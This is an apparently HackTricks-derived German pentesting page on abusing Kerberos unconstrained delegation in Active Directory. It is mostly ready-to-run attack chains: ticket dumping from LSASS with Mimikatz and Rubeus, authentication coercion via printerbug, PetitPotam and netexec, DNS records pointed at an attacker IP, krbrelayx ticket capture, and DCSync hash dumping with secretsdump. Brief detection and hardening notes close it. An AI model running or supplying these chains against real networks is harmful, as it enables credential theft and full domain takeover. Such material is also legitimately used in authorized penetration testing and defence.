# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Dies ist eine Funktion, die ein Domain Administrator auf jeden beliebigen **Computer** innerhalb der Domain setzen kann. Dann wird jedes Mal, wenn sich ein **user logins** auf dem Computer anmeldet, eine **Kopie des TGT** dieses users im **TGS** enthalten sein, der vom DC bereitgestellt wird, und **im Speicher in LSASS gespeichert**. Wenn du also Administratorrechte auf der Maschine hast, kannst du **die tickets dumpen und die users auf jeder Maschine impersonate**.

Wenn sich also ein domain admin auf einem Computer mit aktivierter "Unconstrained Delegation"-Funktion anmeldet und du lokale Administratorrechte auf dieser Maschine hast, kannst du das ticket dumpen und den Domain Admin überall impersonate (domain privesc).

Du kannst **Computer objects mit diesem Attribut finden**, indem du prüfst, ob das Attribut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) enthält. Das kannst du mit einem LDAP-Filter von ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ tun, was powerview auch macht:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Lade das Ticket von Administrator (oder des Opfer-Users) in den Speicher mit **Mimikatz** oder **Rubeus für einen** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Mehr Infos: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Weitere Informationen über Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Wenn ein Angreifer in der Lage ist, einen Computer zu **kompromittieren, der für "Unconstrained Delegation" erlaubt ist**, könnte er einen **Print server** **dazu bringen**, sich **automatisch dort anzumelden** und dabei ein **TGT** im Speicher des Servers zu speichern.\
Dann könnte der Angreifer einen **Pass the Ticket attack** durchführen, um den Benutzer des Print server-Computerkontos zu **impostieren**.

Um einen print server dazu zu bringen, sich gegen irgendeine Maschine anzumelden, kannst du [**SpoolSample**](https://github.com/leechristensen/SpoolSample) verwenden:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Wenn das TGT von einem Domain Controller stammt, könntest du einen [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) durchführen und alle Hashes vom DC erhalten.\
[**Mehr Infos zu diesem Angriff auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Hier findest du weitere Wege, eine **Authentication zu erzwingen:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Jede andere coercion primitive, die das Opfer dazu bringt, sich mit **Kerberos** bei deinem Host mit unconstrained delegation zu authentifizieren, funktioniert ebenfalls. In modernen Umgebungen bedeutet das oft, den klassischen PrinterBug-Flow durch **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** oder **WebClient/WebDAV**-basierte coercion zu ersetzen, abhängig davon, welche RPC-Surface erreichbar ist.

### Ausnutzung eines user/service account mit unconstrained delegation

Unconstrained delegation ist **nicht auf computer objects beschränkt**. Ein **user/service account** kann ebenfalls als `TRUSTED_FOR_DELEGATION` konfiguriert sein. In diesem Szenario ist die praktische Voraussetzung, dass das Konto Kerberos service tickets für einen **SPN**, den es besitzt, erhalten muss.

Daraus ergeben sich 2 sehr häufige offensive Pfade:

1. Du kompromittierst das Passwort/den Hash des unconstrained-delegation **user account**, dann **fügst du einen SPN hinzu** zu demselben Konto.
2. Das Konto hat bereits einen oder mehrere SPNs, aber einer davon verweist auf einen **veralteten/dekommissionierten Hostnamen**; das erneute Anlegen des fehlenden **DNS A record** reicht aus, um den authentication flow zu übernehmen, ohne die SPN-Menge zu ändern.

Minimaler Linux-Flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Hinweise:

- Dies ist besonders nützlich, wenn der unconstrained principal ein **service account** ist und du nur dessen Credentials hast, nicht jedoch code execution auf einem gejointen Host.
- Wenn der Zielbenutzer bereits einen **stale SPN** hat, kann das Neuerstellen des entsprechenden **DNS record** weniger noisy sein als das Schreiben eines neuen SPN in AD.
- Neuere Linux-zentrierte tradecraft nutzt `addspn.py`, `dnstool.py`, `krbrelayx.py` und eine coercion primitive; du musst keinen Windows-Host anfassen, um die Kette abzuschließen.

### Abusing Unconstrained Delegation mit einem vom Angreifer erstellten Computer

Moderne Domains haben oft `MachineAccountQuota > 0` (Standard 10), wodurch jeder authentifizierte principal bis zu N computer objects erstellen kann. Wenn du außerdem das Token privilege `SeEnableDelegationPrivilege` (oder gleichwertige Rechte) besitzt, kannst du den neu erstellten Computer so setzen, dass er für unconstrained delegation trusted ist, und inbound TGTs von privilegierten Systemen harvesten.

High-level flow:

1) Erstelle einen Computer, den du kontrollierst
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Mache den gefälschten Hostnamen innerhalb der Domain auflösbar
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Unconstrained Delegation auf dem angreiferkontrollierten Computer aktivieren
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Warum das funktioniert: Bei unconstrained delegation cached die LSA auf einem Computer mit aktivierter Delegation eingehende TGTs. Wenn du einen DC oder einen privilegierten Server dazu bringst, sich an deinem Fake-Host zu authentifizieren, wird sein Machine-TGT gespeichert und kann exportiert werden.

4) Starte krbrelayx im Export-Modus und bereite das Kerberos-Material vor
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Authentifizierung vom DC/Servern zu deinem Fake-Host erzwingen
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx wird ccache-Dateien speichern, wenn sich eine Maschine authentifiziert, zum Beispiel:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Verwende das erfasste DC-Maschinen-TGT, um DCSync durchzuführen
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Hinweise und Anforderungen:

- `MachineAccountQuota > 0` ermöglicht das Erstellen von Computern ohne Rechte; andernfalls brauchst du explizite Rechte.
- Das Setzen von `TRUSTED_FOR_DELEGATION` auf einem Computer erfordert `SeEnableDelegationPrivilege` (oder Domain Admin).
- Stelle sicher, dass die Namensauflösung zu deinem Fake-Host funktioniert (DNS A-Record), damit der DC ihn per FQDN erreichen kann.
- Coercion erfordert einen brauchbaren Vektor (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN usw.). Deaktiviere diese auf DCs, wenn möglich.
- Wenn das Opferkonto als **"Account is sensitive and cannot be delegated"** markiert ist oder Mitglied von **Protected Users** ist, wird das weitergereichte TGT nicht im Service Ticket enthalten sein, sodass diese Kette kein wiederverwendbares TGT liefert.
- Wenn **Credential Guard** auf dem authentifizierenden Client/Server aktiviert ist, blockiert Windows **Kerberos unconstrained delegation**, was sonst gültige Coercion-Pfade aus Operatorsicht fehlschlagen lassen kann.

Erkennungs- und Hardening-Ideen:

- Auf Event ID 4741 (Computeraccount erstellt) und 4742/4738 (Computer-/Benutzerkonto geändert) alarmieren, wenn UAC `TRUSTED_FOR_DELEGATION` gesetzt ist.
- Auf ungewöhnliche DNS-A-Record-Hinzufügungen in der Domain-Zone achten.
- Auf Spitzen bei 4768/4769 von unerwarteten Hosts und auf DC-Authentifizierungen zu Nicht-DC-Hosts achten.
- `SeEnableDelegationPrivilege` auf einen minimalen Satz beschränken, `MachineAccountQuota=0` setzen, wo möglich, und den Print Spooler auf DCs deaktivieren. LDAP signing und channel binding durchsetzen.

### Mitigation

- DA/Admin-Logins auf bestimmte Services beschränken
- Für privilegierte Konten "Account is sensitive and cannot be delegated" setzen.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
